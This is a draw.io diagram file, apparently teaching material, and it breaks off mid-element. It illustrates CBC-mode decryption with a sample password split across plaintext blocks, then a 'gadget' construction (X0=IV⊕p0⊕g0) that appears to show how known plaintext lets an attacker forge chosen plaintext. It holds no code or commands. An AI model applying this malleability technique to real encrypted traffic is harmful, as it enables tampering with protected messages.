<mxfile host="Electron" modified="2023-10-21T14:35:59.401Z" agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/22.0.3 Chrome/114.0.5735.289 Electron/25.8.4 Safari/537.36" etag="s-LTqAeSYpSHLJjz52dj" version="22.0.3" type="device" pages="2">
  <diagram name="decryption" id="898GM6bTTTrvFnQc2QXk">
    <mxGraphModel dx="1004" dy="655" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="s-LgAmoHU1z0bCXYQNr--111" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--9" target="s-LgAmoHU1z0bCXYQNr--109">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="190" y="230" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--9" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="1">
          <mxGeometry x="110" y="120" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--1" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--2" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--3" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--4" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--5" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--6" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--7" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--8" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--9">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--112" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--10" target="s-LgAmoHU1z0bCXYQNr--110">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="360" y="160" />
              <mxPoint x="450" y="160" />
              <mxPoint x="450" y="230" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--117" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--10" target="s-LgAmoHU1z0bCXYQNr--116">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--10" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="1">
          <mxGeometry x="280" y="120" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--11" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--12" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--13" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--14" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--15" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--16" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--17" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--18" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--10">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--121" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--20" target="s-LgAmoHU1z0bCXYQNr--120">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--20" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="1">
          <mxGeometry x="450" y="120" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--21" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--22" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--23" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--24" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--25" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--26" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--27" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--28" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="s-LgAmoHU1z0bCXYQNr--20">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--29" value="IV" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
          <mxGeometry x="160" y="90" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--30" value="c0" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
          <mxGeometry x="330" y="90" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--31" value="c1" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
          <mxGeometry x="500" y="90" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--119" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=1;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--109">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="360" y="259" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--109" value="" style="shape=orEllipse;perimeter=ellipsePerimeter;whiteSpace=wrap;html=1;backgroundOutline=1;" vertex="1" parent="1">
          <mxGeometry x="350" y="220" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--125" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--110">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="530" y="259" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--110" value="" style="shape=orEllipse;perimeter=ellipsePerimeter;whiteSpace=wrap;html=1;backgroundOutline=1;" vertex="1" parent="1">
          <mxGeometry x="520" y="220" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--118" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--116" target="s-LgAmoHU1z0bCXYQNr--109">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--116" value="decryption" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="325" y="180" width="70" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--122" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="s-LgAmoHU1z0bCXYQNr--120" target="s-LgAmoHU1z0bCXYQNr--110">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--120" value="decryption" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="495" y="180" width="70" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--126" value="p0" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
          <mxGeometry x="330" y="290" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--127" value="p1" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
          <mxGeometry x="500" y="290" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--253" value="&lt;font style=&quot;font-size: 16px;&quot; face=&quot;Courier New&quot;&gt;Your password is&lt;/font&gt;" style="rounded=0;whiteSpace=wrap;html=1;fillColor=#d5e8d4;strokeColor=#82b366;" vertex="1" parent="1">
          <mxGeometry x="280" y="260" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="s-LgAmoHU1z0bCXYQNr--255" value="&lt;div style=&quot;&quot;&gt;&lt;pre style=&quot;&quot;&gt;&lt;font style=&quot;font-size: 16px;&quot; face=&quot;Courier New&quot;&gt;:Se@ld-i5-great&lt;/font&gt;&lt;/pre&gt;&lt;/div&gt;" style="rounded=0;whiteSpace=wrap;html=1;align=left;fillColor=#f8cecc;strokeColor=#b85450;" vertex="1" parent="1">
          <mxGeometry x="450" y="260" width="160" height="20" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
  <diagram id="6RQgyJE9jH5RB0e0XFaZ" name="gadget-decryption">
    <mxGraphModel dx="954" dy="622" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-1" value="" style="group" vertex="1" connectable="0" parent="1">
          <mxGeometry x="110" y="390" width="840" height="230" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-2" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry y="30" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-3" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-4" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-5" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-6" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-7" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-8" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-9" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-10" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-2">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-11" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="170" y="30" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-12" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-13" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-14" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-15" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-16" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-17" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-18" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-19" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-11">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-20" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="340" y="30" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-21" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-22" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-23" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-24" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-25" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-26" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-27" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-28" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-20">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-29" value="X0=IV⨁p0⨁g0&amp;nbsp;" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="35" width="90" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-30" value="c0" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="220" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-31" value="X1=IV⨁p0⨁g1" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="380" width="80" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-32" value="" style="group" vertex="1" connectable="0" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="340" y="169" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-33" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-34" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-35" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-36" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-37" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-38" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-39" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-40" value="?" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-32">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-41" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=1;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-42">
